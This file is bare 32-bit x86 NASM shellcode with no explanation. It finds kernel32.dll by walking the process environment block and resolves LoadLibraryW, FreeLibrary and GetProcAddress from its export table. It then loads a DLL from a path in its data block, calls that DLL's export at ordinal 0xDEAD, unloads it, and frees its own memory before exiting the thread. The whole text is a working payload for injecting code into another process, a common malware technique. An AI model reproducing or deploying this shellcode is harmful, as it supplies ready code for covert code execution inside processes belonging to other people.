BITS 32

ShellCode:
  mov     eax,dword [fs:00000030h]
  sub     esp,14h
  push    ebx
  push    esi
  mov     esi,dword [esp+20h]
  push    edi
  mov     dword [esi+0A08h],eax
  mov     ebx,dword [eax+0Ch]
  add     ebx,14h
  mov     edx,dword [ebx]
  cmp     edx,ebx
  je      label_0x92

label_0x22:
  mov     edi,dword [esi+0A0Ch]

label_0x28:
  mov     eax,dword [edx+28h]
  test    edi,edi
  jne     label_0x59

label_0x2f:
  cmp     dword [eax],45004Bh
  jne     label_0x59

label_0x37:
  cmp     dword [eax+4],4E0052h
  jne     label_0x59

label_0x40:
  cmp     dword [eax+8],4C0045h
  jne     label_0x59

label_0x49:
  cmp     dword [eax+0Ch],320033h
  jne     label_0x59

label_0x52:
  cmp     word [eax+10h],2Eh
  je      label_0x83

label_0x59:
  cmp     dword [eax],65006Bh
  jne     label_0x8c

label_0x61:
  cmp     dword [eax+4],6E0072h
  jne     label_0x8c

label_0x6a:
  cmp     dword [eax+8],6C0065h
  jne     label_0x8c

label_0x73:
  cmp     dword [eax+0Ch],320033h
  jne     label_0x8c

label_0x7c:
  cmp     word [eax+10h],2Eh
  jne     label_0x8c

label_0x83:
  mov     edi,dword [edx+10h]
  mov     dword [esi+0A0Ch],edi

label_0x8c:
  mov     edx,dword [edx]
  cmp     edx,ebx
  jne     label_0x28

label_0x92:
  mov     ebx,dword [esi+0A0Ch]
  mov     eax,5A4Dh
  cmp     word [ebx],ax
  jne     label_0x25b

label_0xa6:
  mov     eax,dword [ebx+3Ch]
  cmp     dword [eax+ebx],4550h
  jne     label_0x25b

label_0xb6:
  movzx   ecx,word [eax+ebx+18h]
  add     eax,4
  mov     edx,10Bh
  cmp     cx,dx
  jne     label_0xcf

label_0xc8:
  mov     ecx,74h
  jmp     label_0xe2

label_0xcf:
  mov     edx,20Bh
  cmp     cx,dx
  jne     label_0x25b

label_0xdd:
  mov     ecx,84h

label_0xe2:
  add     eax,ecx
  mov     eax,dword [eax+ebx]
  add     eax,ebx
  mov     dword [esp+0Ch],eax
  mov     edi,dword [eax+1Ch]
  mov     ecx,dword [eax+20h]
  add     edi,ebx
  mov     edx,dword [eax+24h]
  add     ecx,ebx
  mov     dword [esp+24h],edi
  add     edx,ebx
  xor     edi,edi
  mov     dword [esp+10h],ecx
  mov     dword [esp+14h],edx
  cmp     dword [eax+18h],edi
  jbe     label_0x1da

label_0x113:
  push    ebp
  mov     ebp,dword [esi+0A10h]
  nop     word [eax+eax]

label_0x120:
  movzx   eax,word [edx+edi*2]
  mov     edx,dword [esp+28h]
  mov     ecx,dword [ecx+edi*4]
  add     ecx,ebx
  mov     edx,dword [edx+eax*4]
  add     edx,ebx
  test    ebp,ebp
  jne     label_0x160

label_0x136:
  cmp     dword [ecx],64616F4Ch
  jne     label_0x160

label_0x13e:
  cmp     dword [ecx+4],7262694Ch
  jne     label_0x160

label_0x147:
  cmp     dword [ecx+8],57797261h
  jne     label_0x160

label_0x150:
  cmp     byte [ecx+0Ch],0
  jne     label_0x160

label_0x156:
  mov     ebp,edx
  mov     dword [esi+0A10h],edx
  jmp     label_0x1c3

label_0x160:
  cmp     dword [esi+0A14h],0
  jne     label_0x18b

label_0x169:
  cmp     dword [ecx],65657246h
  jne     label_0x18b

label_0x171:
  cmp     dword [ecx+4],7262694Ch
  jne     label_0x18b

label_0x17a:
  cmp     dword [ecx+8],797261h
  jne     label_0x18b

label_0x183:
  mov     dword [esi+0A14h],edx
  jmp     label_0x1c3

label_0x18b:
  cmp     dword [esi+0A18h],0
  jne     label_0x1c3

label_0x194:
  cmp     dword [ecx],50746547h
  jne     label_0x1c3

label_0x19c:
  cmp     dword [ecx+4],41636F72h
  jne     label_0x1c3

label_0x1a5:
  cmp     dword [ecx+8],65726464h
  jne     label_0x1c3

label_0x1ae:
  mov     eax,dword [ecx+0Ch]
  and     eax,0FFFFFFh
  cmp     eax,7373h
  jne     label_0x1c3

label_0x1bd:
  mov     dword [esi+0A18h],edx

label_0x1c3:
  mov     eax,dword [esp+10h]
  inc     edi
  mov     ecx,dword [esp+14h]
  mov     edx,dword [esp+18h]
  cmp     edi,dword [eax+18h]
  jb      label_0x120

label_0x1d9:
  pop     ebp

label_0x1da:
  lea     eax,[esi+800h]
  push    eax
  mov     eax,dword [esi+0A10h]
  call    eax
  mov     edi,eax
  test    edi,edi
  je      label_0x21d

label_0x1ff:
  mov     ecx,dword [esi+0A18h]
  push    0DEADh
  push    edi
  call    ecx
  test    eax,eax
  je      label_0x214

label_0x211:
  push    esi
  call    eax

label_0x214:
  mov     eax,dword [esi+0A14h]
  push    edi
  call    eax

label_0x21d:
  lea     eax,[esi+string_ExitThread]
  push    eax
  push    dword [esi+0A0Ch]
  mov     eax,dword [esi+0A18h]
  call    eax
  mov     ecx,dword [esi+0A18h]
  mov     edi,eax
  lea     eax,[esi+string_VirtualFree]
  push    eax
  push    dword [esi+0A0Ch]
  call    ecx
  test    eax,eax
  je      label_0x25b

label_0x249:
  test    edi,edi
  je      label_0x25b

label_0x24d:
  push    8000h
  push    0
  push    esi

  push    edi
  jmp     eax

label_0x25b:
  pop     edi
  pop     esi
  pop     ebx
  add     esp,14h
  ret     4

string_VirtualFree db "VirtualFree",0
string_ExitThread db "ExitThread",0
